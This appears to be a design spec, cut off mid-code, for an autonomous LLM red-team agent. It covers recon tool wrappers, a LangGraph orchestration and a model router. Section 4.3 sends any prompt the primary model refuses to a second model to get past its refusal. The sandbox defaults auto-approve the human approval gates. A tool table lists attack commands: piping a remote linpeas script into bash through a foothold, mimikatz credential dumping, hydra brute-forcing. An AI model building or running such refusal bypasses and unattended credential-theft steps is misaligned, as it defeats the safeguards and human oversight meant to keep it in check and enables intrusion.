# AutoRed — Full Kill-Chain Red Team Copilot Design Spec

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a semi-autonomous red-team copilot that runs the full kill chain — recon → vuln → exploit → post-ex → lateral → cleanup → report — against sandboxed targets, with human-in-the-loop gates configurable to auto-approve in sandbox mode.

**Architecture:** LangGraph StateGraph orchestrator driving 8 primary agents (Recon, Vuln, Exploit, Post-Ex, Lateral, Cleanup, Report, RoE-Guard) and 27 specialist sub-agents. Claude Sonnet 4.5 as the primary LLM; DeepSeek 3.2 as second-opinion and filter-fallback. Pydantic `EngagementState` as the inter-agent contract. RoE Guard as a non-LLM policy layer with sandbox config defaulting to allow-all techniques and auto-approve HitL gates.

**Tech Stack (Pinned Versions):**
- Python 3.12+
- `langgraph==0.2.45`
- `langchain-anthropic==0.1.23`
- `langchain-deepseek==0.1.0` (community package, pinned)
- `anthropic==0.39.0`
- `pydantic==2.9.11`
- `typer==0.12.5`
- `rich==13.9.2`
- `textual==0.79.1` (basic TUI in Phase 3+, full TUI in Phase 6)
- `structlog==24.4.0`
- `chromadb==0.5.13`
- `sqlalchemy==2.0.36`
- `aiosqlite==0.20.0`
- `neo4j==5.25.0` (Phase 4+ only)
- `weasyprint==62.3` (Phase 6 only)
- `pytest==8.3.3`, `pytest-asyncio==0.24.0`, `pytest-cov==5.0.0`
- `uv==0.4.20` (package manager)
- `ruff==0.7.1` (linter/formatter)

**Spec:** This document is the authoritative design. Implementation plans per phase will be written to `docs/superpowers/plans/2026-09-21-autored-phase<N>-<name>.md` before each phase begins.

---

## Table of Contents

1. Scope & Phase Decomposition
2. Architecture & Agent Topology
3. Memory & Persistence Layer
4. Model Router
5. Tools Layer (with full command construction)
6. Agent Behavior Specifications (with full prompt templates)
7. Subagent Architecture & Communication
8. RoE Guard & Sandbox Configuration
9. EngagementState Schema (all Pydantic models, full field definitions)
10. Error Handling
11. Logging & Audit
12. Testing Strategy
13. Phase Boundaries & Ship Criteria
14. CLI Reference
15. Configuration Reference
16. Project Structure

---

## 1. Scope & Phase Decomposition

### 1.1 In Scope

This spec covers a full kill-chain red-team copilot. The end state is a tool an operator can point at a sandboxed engagement (HackTheBox box, self-hosted GoAD, cloud lab) and have it execute recon, vulnerability identification, exploitation, post-exploitation, lateral movement, cleanup, and reporting with minimal intervention.

### 1.2 Phase Decomposition

| Phase | Ships | Test Target | Usefulness |
|---|---|---|---|
| **1** | Core framework + Recon Agent | HackTheBox Lame (10.10.10.5) | Structured recon report from a single CLI command |
| **2** | Vuln Agent + self-critique + CVE correlation | HackTheBox Shocker | Adds ranked attack hypotheses |
| **3** | Exploit Agent + HitL gates + evidence capture + **basic TUI** (dashboard + HitL modal) | HackTheBox Blue (EternalBlue) | First full chain: recon → vuln → exploit → foothold, with TUI for approval gates |
| **4** | Post-Ex Agent (6 sub-activities) + BloodHound | GoAD lab (self-hosted) | AD post-exploitation |
| **5** | Lateral Agent (sub-graph recursion) + Cleanup Agent | GoAD lab, multi-host | Full internal engagement with cleanup |
| **6** | Report Agent + **full TUI screens** + cross-engagement memory + polish | Real-shaped engagement | Production-ready copilot |

### 1.3 Out of Scope

- Mobile app testing, IoT hardware attacks, physical pentest, social engineering automation
- Real-time collaborative multi-operator mode (single operator per engagement)
- Cloud provider API attacks (AWS/Azure/GCP control plane)
- Wireless attacks (WiFi/Bluetooth/RFID)
- Firmware reverse engineering
- Custom exploit development (agent uses existing exploits, doesn't write 0-days)

### 1.4 Operator Profile

Working developer (Python daily, async, Pydantic, shipped production agent systems) and professional red teamer (real engagements, knows MITRE ATT&CK, knows what's worth automating).

---

## 2. Architecture & Agent Topology

### 2.1 High-Level Diagram

```
┌──────────────────────────────────────────────────────────────┐
│                      CLI (Typer)                              │
│  autored run --target <ip|cidr|host> --roe <roe.yaml>        │
│  autored resume <engagement_id>                              │
│  autored report <engagement_id>                              │
│  autored roe-wizard                                          │
└──────────────────────────┬───────────────────────────────────┘
                           ▼
┌──────────────────────────────────────────────────────────────┐
│            LangGraph StateGraph (Orchestrator)               │
│   State: EngagementState (Pydantic v2)                       │
│   Topology: conditional edges, parallel branches, HitL       │
│   interrupt_before: [exploit, postex, lateral]               │
│   Checkpointing: SqliteSaver to engagements/<id>/state.db    │
└──────────────────────────┬───────────────────────────────────┘
                           ▼
┌──────────────────────────────────────────────────────────────┐
│                    Model Router (router.py)                  │
│   Routes calls to Sonnet 4.5 (default) or DeepSeek 3.2       │
└──────────────────────────┬───────────────────────────────────┘
                           ▼
┌──────────────────────────────────────────────────────────────┐
│                       Agent Layer (8 primary agents)         │
│  Recon → Vuln → Exploit (HitL) → Post-Ex (HitL) →           │
│  Lateral (HitL) → Cleanup → Report                          │
│                + RoE Guard (non-LLM, veto power)             │
└──────────────────────────┬───────────────────────────────────┘
                           ▼
┌──────────────────────────────────────────────────────────────┐
│                    Sub-Agent Layer (27 specialists)          │
└──────────────────────────┬───────────────────────────────────┘
                           ▼
┌──────────────────────────────────────────────────────────────┐
│                    Tools Layer                               │
│  Phase 1: nmap · httpx · nuclei · feroxbuster · subfinder    │
│           naabu · amass · dnsx · gobuster-vhost              │
│  Phase 2+: sqlmap · hydra · metasploit-rpc · impacket ·      │
│            bloodhound · certipy · kerbrute · netexec ·       │
│            linpeas · winpeas · mimikatz-wrapper · ...        │
└──────────────────────────┬───────────────────────────────────┘
                           ▼
┌──────────────────────────────────────────────────────────────┐
│              Persistence & Audit                             │
│  engagements/<id>/ {state.json, state.db, raw/, evidence/,   │
│                     report.md, report.pdf, lessons.json}     │
│  SQLite engagement DB · Chroma vector store · Neo4j (AD)     │
│  structlog JSON logs → logs/<date>.jsonl                     │
└──────────────────────────────────────────────────────────────┘
```

### 2.2 LangGraph Graph Definition (Phase 1)

The actual LangGraph construction for Phase 1:

```python
# autored/graph.py
from langgraph.graph import StateGraph, END
from langgraph.checkpoint.sqlite.aio import AsyncSqliteSaver
from autored.state import EngagementState
from autored.agents.recon import recon_node
from autored.agents.report import report_node_phase1  # stub for Phase 1
from autored.roe_guard import roe_gate_node

def build_phase1_graph(checkpointer: AsyncSqliteSaver) -> StateGraph:
    graph = StateGraph(EngagementState)

    # Nodes
    graph.add_node("roe_gate_start", roe_gate_node)
    graph.add_node("recon", recon_node)
    graph.add_node("report_phase1", report_node_phase1)

    # Edges
    graph.set_entry_point("roe_gate_start")
    graph.add_edge("roe_gate_start", "recon")
    graph.add_conditional_edges(
        "recon",
        # Decision: if recon produced hosts, go to report; else END
        lambda state: "report_phase1" if state.hosts else END,
        {
            "report_phase1": "report_phase1",
            END: END,
        },
    )
    graph.add_edge("report_phase1", END)

    return graph.compile(checkpointer=checkpointer)
```

### 2.3 LangGraph Graph Definition (Full, Phase 6)

```python
def build_full_graph(checkpointer: AsyncSqliteSaver) -> StateGraph:
    graph = StateGraph(EngagementState)

    # Nodes
    graph.add_node("roe_gate_start", roe_gate_node)
    graph.add_node("recon", recon_node)
    graph.add_node("vuln", vuln_node)
    graph.add_node("exploit", exploit_node)        # interrupt_before
    graph.add_node("postex", postex_node)          # interrupt_before
    graph.add_node("lateral", lateral_node)        # interrupt_before
    graph.add_node("cleanup", cleanup_node)
    graph.add_node("report", report_node)

    # Edges
    graph.set_entry_point("roe_gate_start")
    graph.add_edge("roe_gate_start", "recon")
    graph.add_edge("recon", "vuln")
    graph.add_edge("vuln", "exploit")

    # Exploit: success → postex, failure → report (if all hypotheses exhausted) or back to exploit (try next)
    graph.add_conditional_edges(
        "exploit",
        lambda s: "postex" if s.footholds else
                  ("exploit" if _has_untried_hypotheses(s) else "report"),
    )

    graph.add_edge("postex", "lateral")
    # Lateral: success → spawn sub-engagement (handled inside node) → cleanup
    #          failure → cleanup
    graph.add_edge("lateral", "cleanup")
    graph.add_edge("cleanup", "report")
    graph.add_edge("report", END)

    # HitL interrupts
    return graph.compile(
        checkpointer=checkpointer,
        interrupt_before=["exploit", "postex", "lateral"],
    )
```

### 2.4 Primary Agents (8 Total)

| # | Agent | Mission | Model | Autonomy | Phase |
|---|---|---|---|---|---|
| 1 | **Recon** | Map target | Sonnet 4.5 | Full auto (read-only) | 1 |
| 2 | **Vuln** | Identify vulns, ranked hypotheses | Sonnet 4.5 + DeepSeek critic | Full auto | 2 |
| 3 | **Exploit** | Execute top hypothesis | Sonnet 4.5 | HitL gate before every exploit | 3 |
| 4 | **Post-Ex** | Enumerate, privesc, persist, evade, exfil | Sonnet 4.5 | HitL gate per privesc/persist/evasion/exfil | 4 |
| 5 | **Lateral** | Pivot, spawn sub-engagement | Sonnet 4.5 | HitL gate per pivot | 5 |
| 6 | **Cleanup** | Remove artifacts | Sonnet 4.5 (plan) + scripts (exec) | Auto-run at end, operator confirms | 5 |
| 7 | **Report** | Generate deliverable | Sonnet 4.5 | Full auto | 6 |
| 8 | **RoE Guard** | Non-LLM policy enforcement | None | Always active | 1 |

---

## 3. Memory & Persistence Layer

### 3.1 Four-Layer Memory Model

| Layer | Scope | Lifetime | Tech | What's Stored |
|---|---|---|---|---|
| **1. Working** | Single agent call | Seconds | LangGraph state (in-process) | Current prompt context, tool result |
| **2. Engagement** | One engagement | Hours-days | LangGraph `AsyncSqliteSaver` + `engagements/<id>/` folder | Hosts, services, creds, evidence paths |
| **3. Cross-engagement** | All engagements | Forever | Chroma (vector) + SQLite (structured) | "Last time CVE-X, this exploit worked" |
| **4. Domain knowledge** | Static reference | Forever | Embedded JSON/YAML + Neo4j (AD only) | MITRE ATT&CK graph, BloodHound AD graph |

### 3.2 On-Disk Engagement Layout

```
engagements/
  2026-09-21_001-htb-lame-10.10.10.5/
    state.json              # serialized EngagementState (latest checkpoint)
    state.db                # LangGraph SqliteSaver checkpoint DB
    manifest.json           # engagement metadata
    raw/                    # raw tool output
      nmap_001.out
      nmap_001.err
      httpx_001.json
      nuclei_001.jsonl
    evidence/               # exploit/post-ex evidence
      screenshot_001.png
      shell_session_001.txt
      mimikatz_001.txt
    report.md
    report.pdf
    lessons.json
    audit.jsonl             # every action that affected the target
```

### 3.3 SQLite Schema (Cross-Engagement, `db/engagements.sqlite`)

```sql
-- Cross-engagement structured data
CREATE TABLE engagements (
    id TEXT PRIMARY KEY,
    target TEXT NOT NULL,
    start_ts TEXT NOT NULL,        -- ISO 8601
    end_ts TEXT,
    summary TEXT,
    report_path TEXT,
    operator TEXT NOT NULL,
    phase TEXT NOT NULL,           -- "recon", "vuln", ..., "done"
    parent_engagement_id TEXT,     -- for sub-engagements
    FOREIGN KEY (parent_engagement_id) REFERENCES engagements(id)
);
CREATE INDEX idx_engagements_target ON engagements(target);
CREATE INDEX idx_engagements_start_ts ON engagements(start_ts);
CREATE INDEX idx_engagements_parent ON engagements(parent_engagement_id);

CREATE TABLE findings (
    id TEXT PRIMARY KEY,
    engagement_id TEXT NOT NULL,
    host TEXT NOT NULL,
    port INTEGER,
    service TEXT,
    cve TEXT,
    severity TEXT CHECK(severity IN ('critical','high','medium','low','info')),
    status TEXT CHECK(status IN ('open','confirmed','exploited','false_positive','remediated')),
    evidence_path TEXT,
    discovered_at TEXT NOT NULL,
    FOREIGN KEY (engagement_id) REFERENCES engagements(id)
);
CREATE INDEX idx_findings_engagement ON findings(engagement_id);
CREATE INDEX idx_findings_cve ON findings(cve);
CREATE INDEX idx_findings_severity ON findings(severity);

CREATE TABLE credentials (
    id TEXT PRIMARY KEY,
    engagement_id TEXT NOT NULL,
    username TEXT NOT NULL,
    credential_type TEXT CHECK(credential_type IN ('password','ntlm_hash','kerberos_ticket','ssh_key','private_key','token','other')),
    credential_value TEXT,         -- hashed/encrypted form, never plaintext passwords in DB
    source TEXT,                   -- "mimikatz", "sam_dump", "brute_force", etc.
    target_host TEXT,
    cracked INTEGER DEFAULT 0,
    cracked_value TEXT,            -- plaintext if cracked, else NULL
    discovered_at TEXT NOT NULL,
    FOREIGN KEY (engagement_id) REFERENCES engagements(id)
);
CREATE INDEX idx_creds_engagement ON credentials(engagement_id);
CREATE INDEX idx_creds_username ON credentials(username);

CREATE TABLE lessons (
    id TEXT PRIMARY KEY,
    engagement_id TEXT NOT NULL,
    category TEXT CHECK(category IN ('technique_worked','cve_exploited','tool_issue','opsec_failure','misconfiguration','other')),
    body TEXT NOT NULL,
    mitre_technique_id TEXT,       -- e.g., "T1059.004"
    created_at TEXT NOT NULL,
    FOREIGN KEY (engagement_id) REFERENCES engagements(id)
);
CREATE INDEX idx_lessons_category ON lessons(category);
CREATE INDEX idx_lessons_mitre ON lessons(mitre_technique_id);
```

### 3.4 Chroma Collections (`db/chroma/`)

```python
# autored/persistence/chroma_store.py
import chromadb
from chromadb.config import Settings

client = chromadb.PersistentClient(path="db/chroma")

# Collection 1: finding embeddings (for "find similar past findings")
findings_collection = client.get_or_create_collection(
    name="finding_embeddings",
    metadata={"hnsw:space": "cosine"},
    embedding_function=chromadb.utils.embedding_functions.DefaultEmbeddingFunction(),
)

# Collection 2: technique patterns (for "this ATT&CK technique worked when...")
techniques_collection = client.get_or_create_collection(
    name="technique_patterns",
    metadata={"hnsw:space": "cosine"},
)
```

**Query example (Vuln Agent):**
```python
def find_similar_findings(cve: str, top_k: int = 5) -> list[dict]:
    results = findings_collection.query(
        query_texts=[f"CVE: {cve}"],
        n_results=top_k,
    )
    return results["metadatas"][0]
```

### 3.5 Neo4j (Phase 4+ Only, Docker-Compose)

```yaml
# docker-compose.neo4j.yml — started only for AD engagements
services:
  neo4j:
    image: neo4j:5.25-community
    ports:
      - "7474:7474"   # browser UI
      - "7687:7687"   # bolt
    environment:
      - NEO4J_AUTH=neo4j/autored_local_dev
      - NEO4J_PLUGINS=["apoc","graph-data-science"]
    volumes:
      - ./db/neo4j/data:/data
      - ./db/neo4j/logs:/logs
```

Started on-demand via `subprocess.run(["docker", "compose", "-f", "docker-compose.neo4j.yml", "up", "-d"])` when BloodHound collection begins.

---

## 4. Model Router

### 4.1 Routing Table

```python
# autored/router.py
from typing import Literal
from langchain_anthropic import ChatAnthropic
from langchain_core.language_models import BaseChatModel
import os

ModelName = Literal["claude-sonnet-4-5", "deepseek-3.2"]

ROUTING_TABLE: dict[str, ModelName] = {
    # Sonnet 4.5 — default for everything
    "plan_recon":          "claude-sonnet-4-5",
    "plan_exploit":        "claude-sonnet-4-5",
    "parse_nmap":          "claude-sonnet-4-5",
    "parse_nuclei":        "claude-sonnet-4-5",
    "parse_httpx":         "claude-sonnet-4-5",
    "synthesize_findings": "claude-sonnet-4-5",
    "critique_plan":       "claude-sonnet-4-5",
    "write_report":        "claude-sonnet-4-5",
    "decide_next_step":    "claude-sonnet-4-5",
    "hitl_summary":        "claude-sonnet-4-5",
    "generate_payload":    "claude-sonnet-4-5",
    "generate_command":    "claude-sonnet-4-5",
    "plan_postex":         "claude-sonnet-4-5",
    "plan_lateral":        "claude-sonnet-4-5",
    "plan_cleanup":        "claude-sonnet-4-5",

    # DeepSeek 3.2 — second opinion + filter fallback only
    "second_opinion":      "deepseek-3.2",
    "filter_blocked":      "deepseek-3.2",
}

# Model instances (cached)
_model_cache: dict[ModelName, BaseChatModel] = {}

def get_model(task: str) -> BaseChatModel:
    """Get the LLM for a given task type. Caches model instances."""
    model_name = ROUTING_TABLE.get(task, "claude-sonnet-4-5")
    if model_name not in _model_cache:
        if model_name == "claude-sonnet-4-5":
            _model_cache[model_name] = ChatAnthropic(
                model="claude-sonnet-4-5",
                api_key=os.environ["ANTHROPIC_API_KEY"],
                temperature=0.2,        # low temp for deterministic tool calls
                max_tokens=8192,
                timeout=120,
                max_retries=3,
            )
        elif model_name == "deepseek-3.2":
            # DeepSeek via OpenAI-compatible API
            from langchain_openai import ChatOpenAI
            _model_cache[model_name] = ChatOpenAI(
                model="deepseek-chat",  # DeepSeek V3
                api_key=os.environ["DEEPSEEK_API_KEY"],
                base_url="https://api.deepseek.com/v1",
                temperature=0.3,
                max_tokens=8192,
                timeout=120,
                max_retries=3,
            )
    return _model_cache[model_name]
```

### 4.2 Self-Critique Loop (Vuln Agent)

```
Step 1: Sonnet generates 3-5 attack hypotheses
Step 2: DeepSeek receives hypotheses + prompt:
        "A senior pentester would find these flaws in this plan: ..."
        Returns critique text
Step 3: Sonnet receives critique, revises hypotheses
Step 4: DeepSeek final sanity check:
        "For each hypothesis: is the cited CVE real? Is each tool flag correct?"
        Returns per-hypothesis verdict
Step 5: Output final hypotheses with confidence notes
Max 3 iterations. If no convergence, ship best version.
```

### 4.3 Filter Fallback Flow

```python
async def call_with_fallback(task: str, prompt: str) -> str:
    """Call primary model; on refusal, fall back to DeepSeek."""
    primary = get_model(task)
    try:
        response = await primary.ainvoke(prompt)
        if _is_refusal(response):
            log.warning(f"Primary model refused task {task}, falling back to DeepSeek")
            fallback = get_model("filter_blocked")
            response = await fallback.ainvoke(prompt)
        return response.content
    except Exception as e:
        log.error(f"LLM call failed: {e}")
        raise
```

---

## 5. Tools Layer

### 5.1 Tool Wrapper Pattern (Concrete)

Every tool follows this exact pattern:

```python
# autored/tools/nmap.py
import asyncio
import xml.etree.ElementTree as ET
from datetime import datetime
from pathlib import Path
from typing import Literal
from pydantic import BaseModel, Field
from langchain_core.tools import tool
from autored.roe_guard import roe_guard
from autored.logging import get_logger

log = get_logger("tools.nmap")

# --- Pydantic models ---

class NmapPort(BaseModel):
    port: int
    protocol: Literal["tcp", "udp"]
    state: Literal["open", "closed", "filtered", "open|filtered"]
    service: str | None = None
    version: str | None = None
    product: str | None = None

class NmapHost(BaseModel):
    ip: str
    hostname: str | None = None
    mac: str | None = None
    os_guess: str | None = None
    ports: list[NmapPort] = Field(default_factory=list)

class NmapResult(BaseModel):
    target: str
    scan_type: str
    started_at: datetime
    duration_sec: float
    hosts: list[NmapHost]
    raw_output_path: str
    command: str

# --- Command construction ---

NMAP_FLAGS = {
    "quick":   "-T4 -F --top-ports 100",
    "full":    "-T4 -p- --min-rate 5000",
    "udp":     "-sU --top-ports 50 -T4",
    "vuln":    "-T4 -A --script vuln -p-",
    "service": "-T4 -sV -sC -p-",  # service + default scripts
}

def _build_nmap_cmd(target: str, scan_type: str, ports: str | None = None) -> list[str]:
    flags = NMAP_FLAGS.get(scan_type, NMAP_FLAGS["quick"])
    cmd = ["nmap", "-oX", "-", "--stats-every", "10s"]
    cmd.extend(flags.split())
    if ports:
        cmd.extend(["-p", ports])
    cmd.append(target)
    return cmd

# --- Raw output saving ---

async def _save_raw(tool: str, target: str, stdout: str, stderr: str, engagement_id: str) -> str:
    raw_dir = Path(f"engagements/{engagement_id}/raw")
    raw_dir.mkdir(parents=True, exist_ok=True)
    nonce = datetime.utcnow().strftime("%H%M%S_%f")[:10]
    out_path = raw_dir / f"{tool}_{nonce}.out"
    err_path = raw_dir / f"{tool}_{nonce}.err"
    out_path.write_text(stdout)
    err_path.write_text(stderr)
    return str(out_path)

# --- XML parser ---

def _parse_nmap_xml(xml_str: str) -> list[NmapHost]:
    root = ET.fromstring(xml_str)
    hosts = []
    for host_elem in root.findall("host"):
        ip = host_elem.find("address").get("addr")
        hostnames = [h.get("name") for h in host_elem.findall("./hostnames/hostname")]
        hostname = hostnames[0] if hostnames else None
        ports = []
        for port_elem in host_elem.findall("./ports/port"):
            port = int(port_elem.get("portid"))
            protocol = port_elem.get("protocol")
            state = port_elem.find("state").get("state")
            service_elem = port_elem.find("service")
            service = service_elem.get("name") if service_elem is not None else None
            product = service_elem.get("product") if service_elem is not None else None
            version = service_elem.get("version") if service_elem is not None else None
            ports.append(NmapPort(
                port=port, protocol=protocol, state=state,
                service=service, product=product, version=version,
            ))
        hosts.append(NmapHost(ip=ip, hostname=hostname, ports=ports))
    return hosts

# --- Subprocess runner ---

async def _run_subprocess(cmd: list[str], timeout: int = 600) -> tuple[str, str, int, float]:
    start = datetime.utcnow()
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        duration = (datetime.utcnow() - start).total_seconds()
        return stdout.decode(), stderr.decode(), proc.returncode, duration
    except asyncio.TimeoutError:
        proc.kill()
        raise TimeoutError(f"Command timed out after {timeout}s: {' '.join(cmd)}")

# --- The tool itself ---

@roe_guard(allowed_categories=["recon", "read_only"])
@tool
async def nmap_scan(
    target: str,
    scan_type: Literal["quick", "full", "udp", "vuln", "service"] = "quick",
    ports: str | None = None,
    engagement_id: str = "",
) -> NmapResult:
    """Run nmap against target. Returns parsed services and ports.

    Args:
        target: IP, CIDR, or hostname to scan
        scan_type: One of: quick (top 100), full (all ports), udp, vuln, service
        ports: Optional port range string (e.g., "1-1000" or "80,443,8080")
        engagement_id: Current engagement ID for raw output storage

    Returns:
        NmapResult with parsed hosts, ports, services
    """
    cmd = _build_nmap_cmd(target, scan_type, ports)
    log.info("nmap_start", target=target, scan_type=scan_type, cmd=cmd)

    stdout, stderr, returncode, duration = await _run_subprocess(cmd, timeout=600)
    raw_path = await _save_raw("nmap", target, stdout, stderr, engagement_id)

    if returncode != 0:
        log.error("nmap_failed", target=target, returncode=returncode, stderr=stderr[:500])
        raise RuntimeError(f"nmap failed: {stderr[:500]}")

    hosts = _parse_nmap_xml(stdout)
    log.info("nmap_done", target=target, hosts_found=len(hosts), duration=duration)

    return NmapResult(
        target=target,
        scan_type=scan_type,
        started_at=datetime.utcnow(),
        duration_sec=duration,
        hosts=hosts,
        raw_output_path=raw_path,
        command=" ".join(cmd),
    )
```

### 5.2 Phase 1 Tool Inventory — Complete Command Construction

#### `nmap_scan`
- **Command:** `nmap -oX - --stats-every 10s {flags} [-p {ports}] {target}`
- **Flags by scan_type:**
  - `quick`: `-T4 -F --top-ports 100`
  - `full`: `-T4 -p- --min-rate 5000`
  - `udp`: `-sU --top-ports 50 -T4`
  - `vuln`: `-T4 -A --script vuln -p-`
  - `service`: `-T4 -sV -sC -p-`
- **Timeout:** 600s (10 min)
- **Output:** XML to stdout, parsed to `NmapResult`

#### `naabu_scan`
- **Command:** `naabu -host {target} -port {ports|top-1000} -json -silent`
- **Default ports:** top-1000
- **Timeout:** 300s
- **Output:** JSON lines, parsed to `PortList`

```python
class NaabuPort(BaseModel):
    port: int
    protocol: Literal["tcp", "udp"]
    host: str

class PortList(BaseModel):
    target: str
    ports: list[NaabuPort]
    raw_output_path: str
```

#### `httpx_probe`
- **Command:** `httpx -u {url} -tech-detect -status-code -title -json -silent`
- **Timeout:** 60s per host
- **Output:** JSON, parsed to `HttpxResult`

```python
class HttpxResult(BaseModel):
    url: str
    status_code: int
    title: str | None
    tech_stack: list[str]     # e.g., ["Apache", "PHP", "WordPress"]
    content_length: int
    web_server: str | None    # e.g., "nginx/1.17.3"
    redirects: bool
    final_url: str | None
    raw_output_path: str
```

#### `feroxbuster_dir`
- **Command:** `feroxbuster -u {url} -w {wordlist} -d {depth} --json -q`
- **Default wordlist:** `/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt`
- **Default depth:** 3
- **Timeout:** 600s
- **Output:** JSON lines, parsed to `DirResult[]`

```python
class DirResult(BaseModel):
    url: str
    status_code: int
    content_length: int
    method: str
    extension: str | None
    word: str                  # the path that was found
```

#### `nuclei_scan`
- **Command:** `nuclei -u {target} -t {templates} -jsonl -silent`
- **Default templates:** `cves/`, `vulnerabilities/`, `misconfiguration/`, `exposures/`
- **Timeout:** 900s (15 min)
- **Output:** JSONL, parsed to `NucleiResult[]`

```python
class NucleiResult(BaseModel):
    template_id: str
    template_url: str
    matched_at: str            # the URL/host that matched
    severity: Literal["info", "low", "medium", "high", "critical"]
    type: str                  # e.g., "cve", "exposure", "misconfiguration"
    description: str
    reference: list[str]
    cvss_score: float | None
    cve: str | None
    extracted_data: dict       # arbitrary key-value
```

#### `subfinder_enum`
- **Command:** `subfinder -d {domain} -json -silent`
- **Timeout:** 120s
- **Output:** JSON lines, parsed to `SubdomainList`

```python
class SubdomainList(BaseModel):
    domain: str
    subdomains: list[str]
    source: list[str]          # which passive sources found each
```

#### `amass_enum`
- **Command:** `amass enum -passive -d {domain} -json {output_file}`
- **Timeout:** 600s
- **Output:** JSON, parsed to `SubdomainList` (merged with subfinder)

#### `dns_resolve`
- **Command:** `dnsx -d {hostname} -a -aaaa -cname -mx -txt -json -silent`
- **Timeout:** 30s
- **Output:** JSON, parsed to `DnsResult`

```python
class DnsRecord(BaseModel):
    hostname: str
    record_type: Literal["A", "AAAA", "CNAME", "MX", "TXT", "NS", "SOA"]
    value: str
    ttl: int

class DnsResult(BaseModel):
    hostname: str
    records: list[DnsRecord]
```

#### `gobuster_vhost`
- **Command:** `gobuster vhost -u {url} -w {wordlist} --no-error -q`
- **Default wordlist:** `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
- **Timeout:** 300s
- **Output:** text, parsed to `VhostList`

```python
class VhostEntry(BaseModel):
    hostname: str
    status_code: int
    content_length: int

class VhostList(BaseModel):
    domain: str
    vhosts: list[VhostEntry]
```

### 5.3 Phase 2+ Tool Inventory (Brief, Expanded in Phase Specs)

| Tool | Command Sketch | Phase |
|---|---|---|
| `nvd_query` | HTTP GET to `https://services.nvd.nist.gov/rest/json/cves/2.0?cpeName={cpe}` | 2 |
| `searchsploit` | `searchsploit --json "{service} {version}"` | 2 |
| `sqlmap_run` | `sqlmap -u {url} --batch --output-dir={dir} --results-file={file}` | 3 |
| `hydra_brute` | `hydra -L {users} -P {passwords} {service}://{target}` | 3 |
| `metasploit_rpc` | MSG-RPC to `msfrpcd` (running on localhost:55553) | 3 |
| `linpeas_run` | `curl {host}/linpeas.sh \| bash` via foothold shell | 4 |
| `winpeas_run` | `winpeas.exe` via foothold shell | 4 |
| `bloodhound_collect` | `bloodhound-python -u {user} -p {pass} -d {domain} -c All` | 4 |
| `mimikatz_wrapper` | `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit` via foothold | 4 |
| `impacket_wmiexec` | `wmiexec.py {domain}/{user}:{pass}@{target}` | 5 |
| `crackmapexec` | `crackmapexec {protocol} {target} -u {users} -H {hashes}` | 5 |
| `ligolo_connect` | `ligolo-ng --connect {proxy_ip}:11601` | 5 |

---

## 6. Agent Behavior Specifications

### 6.1 Recon Agent

**Mission:** Map the target. Produce structured `Host[]`, `Service[]`, `WebApp[]`, `Subdomain[]`, `DiscoveredPath[]` records.

**LangGraph Node Implementation:**

```python
# autored/agents/recon.py
from langgraph.graph import MessagesState
from autored.state import EngagementState
from autored.router import get_model
from autored.subagents.portscan import portscan_subagent
from autored.subagents.webenum import webenum_subagent
from autored.subagents.subdomainenum import subdomainenum_subagent
from autored.subagents.dnsenum import dnsenum_subagent
from autored.subagents.vhostenum import vhostenum_subagent
from autored.logging import get_logger
import asyncio
import json

log = get_logger("agents.recon")

RECON_PLAN_PROMPT = """You are the Recon Agent in AutoRed, a red team automation system.
Your job is to plan read-only reconnaissance against a target.

You have these sub-agents available:
- portscan_subagent(target, scan_type): runs naabu + nmap
- webenum_subagent(url): runs httpx + feroxbuster + nuclei (web templates)
- subdomainenum_subagent(domain): runs subfinder + amass
- dnsenum_subagent(hostname): runs dnsx
- vhostenum_subagent(domain): runs gobuster vhost

Target scope: {target_scope}
Engagement ID: {engagement_id}

Produce a JSON recon plan with this exact schema:
{{
  "steps": [
    {{
      "subagent": "portscan" | "webenum" | "subdomainenum" | "dnsenum" | "vhostenum",
      "args": {{"target": "...", "scan_type": "quick"}},
      "depends_on": [step_index, ...]   // 0-indexed, empty if no deps
    }}
  ]
}}

Rules:
- All steps must reference a real sub-agent from the list above
- Steps with no dependencies can run in parallel
- Do NOT plan any exploitation. Recon only.
- For CIDR targets, plan portscan with scan_type="quick" first
- For domain targets, plan subdomainenum + dnsenum first, then portscan per discovered host
- For HTTP services, always plan webenum
"""

async def recon_node(state: EngagementState) -> dict:
    """LangGraph node: runs Recon Agent."""
    log.info("recon_start", engagement_id=state.engagement_id, target=state.target_scope)

    model = get_model("plan_recon")
    prompt = RECON_PLAN_PROMPT.format(
        target_scope=state.target_scope,
        engagement_id=state.engagement_id,
    )

    # Step 1: Get plan from LLM
    response = await model.ainvoke(prompt)
    plan = _parse_plan_response(response.content)

    log.info("recon_plan", steps=len(plan["steps"]))

    # Step 2: Execute plan, respecting dependencies
    results = await _execute_plan(plan, state)

    # Step 3: Merge results into state
    new_hosts = _extract_hosts(results)
    new_services = _extract_services(results)
    new_web_apps = _extract_web_apps(results)
    new_subdomains = _extract_subdomains(results)
    new_directories = _extract_directories(results)

    log.info("recon_done",
             hosts=len(new_hosts),
             services=len(new_services),
             web_apps=len(new_web_apps))

    return {
        "hosts": state.hosts + new_hosts,
        "services": state.services + new_services,
        "web_apps": state.web_apps + new_web_apps,
        "subdomains": state.subdomains + new_subdomains,
        "directories": state.directories + new_directories,
        "phase": "vuln",
        "iteration_count": state.iteration_count + 1,
    }
```

**Sub-agent execution with parallel fan-out:**

```python
async def _execute_plan(plan: dict, state: EngagementState) -> list[dict]:
    """Execute recon plan, respecting step dependencies."""
    results: list[dict | None] = [None] * len(plan["steps"])
    pending = set(range(len(plan["steps"])))

    while pending:
        # Find steps whose dependencies are satisfied
        ready = [
            i for i in pending
            if all(results[dep] is not None for dep in plan["steps"][i].get("depends_on", []))
        ]
        if not ready:
            raise RuntimeError("Deadlock: no steps ready but pending remain")

        # Execute ready steps in parallel
        async def run_step(idx: int) -> tuple[int, dict]:
            step = plan["steps"][idx]
            log.info("recon_step_start", step=idx, subagent=step["subagent"])
            try:
                result = await _dispatch_subagent(step, state)
                log.info("recon_step_done", step=idx, subagent=step["subagent"])
                return idx, result
            except Exception as e:
